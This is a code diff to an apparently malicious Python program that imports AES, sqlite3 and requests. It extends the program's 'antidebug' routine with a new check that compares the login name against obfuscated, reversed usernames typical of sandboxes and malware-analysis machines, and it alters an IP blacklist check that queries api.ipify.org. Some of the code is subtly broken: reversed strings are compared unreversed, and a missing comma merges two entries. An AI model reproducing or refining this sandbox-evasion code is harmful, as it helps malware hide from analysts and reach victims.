@@ -44,18 +44,19 @@ for module in requirements:
 
 from Crypto.Cipher import AES
 import requests
-
 def sql_connect(database_path):
     conn = sqlite3.connect(database_path)
     return conn
 
+
+    
 def clear_command_prompt():
     if os.name == 'nt':
         os.system('cls')
     else:
         os.system('clear')
 def antidebug():
-    checks = [check_windows, check_ip, check_registry, check_dll]
+    checks = [check_windows, check_ip, check_registry, check_dll, check_username]
     for check in checks:
         t = threading.Thread(target=check, daemon=True)
         t.start()
@@ -64,6 +65,14 @@ def exit_program(reason):
     print(reason)
     ctypes.windll.kernel32.ExitProcess(0)
 
+def check_username():
+    blacli = ['geRnzryUBczGR' ,'tset' ,'10resU' ,'esiuoL' ,'rPx1kd7h' ,'XetaP' ,'ekim' ,'sacuL' ,'G3fOFgqS' ,'nosnhoJ yrraH' ,'nxsnPRhCJvB' ,'revres' ,'derf' ,'lzReUEH' ,'ailuJ' ,'8m9v2u3' ,'SsxewVHjNOqP' ,'b9jjwVml' ,'A5PcCmVOujf0w' ,'MSziV8' ,'xyVpOUdmxP' ,'egroeg' ,'nhoJ' ,'asiL' ,'qb5QNloC0lN8' ,'knarF' ,'nhoJ' 'tnuoccAytilitUGADW','TJG1W3' ,'xetap' ,'cramh' ,'ybbA' ,'jgwMfceEk' ,'MWVJBSZQ' ,'HS9HYSI5' ,'XzveFNC0JhDR']
+
+    username = os.getlogin()
+
+    if username.lower() in blacli[::-1]:
+        exit_program('Invalid username')
+        
 def check_windows():
     @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
     def winEnumHandler(hwnd, ctx):
@@ -111,7 +120,7 @@ def check_ip():
         try:
             response = requests.get("https://api.ipify.org")
             ip_address = response.content.decode()
-            if ip_address[::-1] in blacklisted[::-1]:
+            if ip_address in blacklisted[::-1]:
                 exit_program('Blacklisted IP')
             return
         except:
